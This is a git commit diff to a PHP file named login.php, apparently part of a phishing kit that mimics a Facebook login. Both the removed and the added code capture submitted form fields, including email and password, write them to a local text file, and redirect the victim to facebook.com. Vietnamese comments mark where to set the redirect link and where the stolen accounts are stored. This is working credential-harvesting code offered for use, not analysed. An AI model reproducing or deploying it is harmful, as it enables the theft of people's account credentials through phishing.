545b9a6052ee1b3400fc4ea144d90f9227806d15
Vuhaidt <58172204+Vuhaidt@users.noreply.github.com>
2021-02-16 08:24:31 +0700

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,13 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
-exit();
+header("Location:  https://facebook.com/ "); //nhập link các bạn muốn chuyển đến 
+$handle = fopen("log.txt", "a");//nơi lưu tài khoản
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
